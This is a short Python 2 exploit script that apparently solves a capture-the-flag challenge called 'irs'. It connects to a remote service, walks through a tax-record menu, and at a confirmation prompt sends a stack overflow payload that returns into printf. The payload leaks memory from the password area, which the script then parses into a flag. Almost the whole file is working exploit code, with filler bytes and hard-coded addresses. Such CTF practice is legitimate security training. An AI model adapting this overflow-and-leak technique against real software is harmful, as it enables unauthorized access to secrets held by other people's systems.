import socket, struct
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            print "Server disconnected"
            exit()
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            print "Server disconnected"
            exit()
        res += data
        
    return res[:-(len(s))]
    
def I(n):
    return struct.pack("<I", n)

sc = socket.create_connection(("irs.pwn.republican", 4127))

#print read_until(sc, "5. Exit")
sc.send("1\n")
#print read_until(sc, "Enter the name:")
sc.send("test\n")
#print read_until(sc, "Enter the password:")
sc.send("test\n")
#print read_until(sc, "Enter the income:")
sc.send("123\n")
#print read_until(sc, "Enter the deductions:")
sc.send("123\n")

#print read_until(sc, "5. Exit")
sc.send("3\n")
#print read_until(sc, "Enter the name of the file to edit:")
sc.send("test\n")
#print read_until(sc, "Enter the password:")
sc.send("test\n")
#print read_until(sc, "Enter the new income:")
sc.send("123\n")
#print read_until(sc, "Enter the new deductible:")
sc.send("123\n")
read_until(sc, "y/n")

do_printf = 0x080484D0
password_start = 0x08048AC2

sc.send("a" * 0x15 + I(0x66666666) + I(do_printf) + I(0x66666666) + I(password_start) + "\n")

read_until(sc, "Your changes have been recorded!\r\n")
data = sc.recv(128)

flag = ""
for i in xrange(0, len(data), 7):
    flag += data[i:i+4]
    
print repr(flag)
